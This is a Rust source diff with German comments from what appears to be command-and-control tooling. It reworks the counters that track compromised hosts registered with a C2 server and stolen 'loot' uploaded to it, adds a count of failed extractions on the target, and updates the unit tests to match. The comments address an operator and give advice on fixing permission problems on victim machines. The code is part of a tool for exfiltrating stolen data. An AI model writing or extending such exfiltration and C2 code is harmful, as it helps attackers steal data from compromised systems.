@@ -55,10 +55,20 @@ pub struct Ergebnis {
     pub hosts_registriert: usize,
     /// Die Hosts, deren Registrierung gescheitert ist.
     pub hosts_verloren: usize,
-    /// Die Beute, die der Server angenommen hat.
-    pub beute_gemeldet: usize,
+    /// Die Beute, deren Upload der Server angenommen hat.
+    ///
+    /// Das ist eine Aussage über die **Verbindung**, nicht über den
+    /// Serverzustand: ein Timeout nach dem Schreiben zählt hier als Verlust.
+    /// Der Server hält die Zeile trotzdem — der Zähler kann es nicht wissen.
+    pub beute_uebertragen: usize,
     /// Die Beute, die gefunden wurde, aber nicht ankam.
     pub beute_verloren: usize,
+    /// Die Beute, die gar nicht erst gefunden wurde: die Extraktion schlug fehl.
+    ///
+    /// Das ist ein anderes Problem als „verloren" — ein Zugriffsproblem auf
+    /// dem Ziel, kein Übertragungsproblem zum C2. Der Operator handelt
+    /// unterschiedlich: hier lohnt ein Blick auf die Rechte auf dem Ziel.
+    pub beute_nicht_extrahiert: usize,
 }
 
 impl Ergebnis {
@@ -94,8 +104,9 @@ impl Ergebnis {
         Ergebnis {
             hosts_registriert: self.hosts_registriert + andere.hosts_registriert,
             hosts_verloren: self.hosts_verloren + andere.hosts_verloren,
-            beute_gemeldet: self.beute_gemeldet + andere.beute_gemeldet,
+            beute_uebertragen: self.beute_uebertragen + andere.beute_uebertragen,
             beute_verloren: self.beute_verloren + andere.beute_verloren,
+            beute_nicht_extrahiert: self.beute_nicht_extrahiert + andere.beute_nicht_extrahiert,
         }
     }
 }
@@ -192,7 +203,7 @@ pub fn melde(port: &dyn C2Port, sealer: Option<&KeySealer>, funde: &[HostFund]) 
                 }
             };
             match port.melde_beute(&upload) {
-                Ok(()) => ergebnis.beute_gemeldet += 1,
+                Ok(()) => ergebnis.beute_uebertragen += 1,
                 Err(e) => {
                     error!("Beute nicht gemeldet: {e}");
                     ergebnis.beute_verloren += 1;
@@ -358,7 +369,7 @@ mod tests {
         let sealer = gueltiger_sealer();
         let ergebnis = melde(&port, Some(&sealer), &[fund("192.168.1.5", 2)]);
 
-        assert_eq!(ergebnis.beute_gemeldet, 2);
+        assert_eq!(ergebnis.beute_uebertragen, 2);
         let hosts = port.hosts();
         assert_eq!(hosts.len(), 1);
         assert!(
@@ -396,7 +407,7 @@ mod tests {
             port.uploads().is_empty(),
             "die Beute ging trotz kaputter Kryptografie raus"
         );
-        assert_eq!(ergebnis.beute_gemeldet, 0);
+        assert_eq!(ergebnis.beute_uebertragen, 0);
         assert_eq!(ergebnis.beute_verloren, 3);
         assert_eq!(
             ergebnis.hosts_registriert, 1,
@@ -456,13 +467,13 @@ mod tests {
 
         assert_eq!(ergebnis.hosts_registriert, 1);
         assert_eq!(ergebnis.hosts_verloren, 1);
-        assert_eq!(ergebnis.beute_gemeldet, 1);
+        assert_eq!(ergebnis.beute_uebertragen, 1);
         assert_eq!(ergebnis.beute_verloren, 2);
         assert!(ergebnis.fehlgeschlagen());
     }
 
     #[test]
-    fn der_host_wird_vor_seiner_beute_gemeldet() {
+    fn der_host_wird_vor_seiner_beute_uebertragen() {
         let port = Aufzeichner::neu();
         melde(&port, None, &[fund("192.168.1.5", 2)]);
         assert_eq!(
@@ -483,7 +494,7 @@ mod tests {
         );
         assert_eq!(ergebnis.hosts_registriert, 0);
         assert_eq!(ergebnis.hosts_verloren, 1);
-        assert_eq!(ergebnis.beute_gemeldet, 0);
+        assert_eq!(ergebnis.beute_uebertragen, 0);
         assert_eq!(ergebnis.beute_verloren, 3, "die Beute zaehlt als verloren");
         assert!(ergebnis.fehlgeschlagen());
     }
@@ -494,7 +505,7 @@ mod tests {
         let ergebnis = melde(&port, None, &[fund("192.168.1.5", 2)]);
 
         assert_eq!(ergebnis.hosts_registriert, 1);
-        assert_eq!(ergebnis.beute_gemeldet, 0);
+        assert_eq!(ergebnis.beute_uebertragen, 0);
         assert_eq!(ergebnis.beute_verloren, 2);
         assert!(
             ergebnis.fehlgeschlagen(),
@@ -508,7 +519,7 @@ mod tests {
         let ergebnis = melde(&port, None, &[fund("192.168.1.5", 2)]);
 
         assert_eq!(ergebnis.hosts_registriert, 1);
-        assert_eq!(ergebnis.beute_gemeldet, 2);
+        assert_eq!(ergebnis.beute_uebertragen, 2);
         assert_eq!(ergebnis.beute_verloren, 0);
         assert!(!ergebnis.fehlgeschlagen());
     }
@@ -537,20 +548,22 @@ mod tests {
         let erste = Ergebnis {
             hosts_registriert: 1,
             hosts_verloren: 0,
-            beute_gemeldet: 2,
+            beute_uebertragen: 2,
             beute_verloren: 1,
+            beute_nicht_extrahiert: 0,
         };
         let zweite = Ergebnis {
             hosts_registriert: 3,
             hosts_verloren: 1,
-            beute_gemeldet: 5,
+            beute_uebertragen: 5,
             beute_verloren: 0,
+            beute_nicht_extrahiert: 0,
         };
         let gesamt = erste.zusammenfuehren(zweite);
 
         assert_eq!(gesamt.hosts_registriert, 4);
         assert_eq!(gesamt.hosts_verloren, 1);
-        assert_eq!(gesamt.beute_gemeldet, 7);
+        assert_eq!(gesamt.beute_uebertragen, 7);
         assert_eq!(gesamt.beute_verloren, 1);
     }
 }
